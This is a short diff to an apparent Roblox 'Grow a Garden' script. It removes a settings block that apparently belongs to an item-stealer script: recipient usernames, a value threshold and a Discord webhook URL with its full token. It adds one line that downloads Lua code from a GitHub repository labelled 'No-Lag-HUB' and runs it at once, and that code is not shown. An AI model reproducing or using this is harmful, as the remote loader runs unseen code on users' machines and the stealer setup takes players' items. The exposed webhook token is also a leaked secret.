@@ -1,5 +1,1 @@
-GAG settings:
-_G.Usernames = {"AxolotlBestYo", "JohnScriptBlox", "JohnScriptBlox2"}
-_G.min_value = 100000000
-_G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1374587479180574871/mylwKkEEBQPSLM42lZEGxTxNsQ3G8UJJfdqQ75D-TH_Qg4l0ofgim0q2YEtpG-y9S3Xd" -- change to your webhook
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
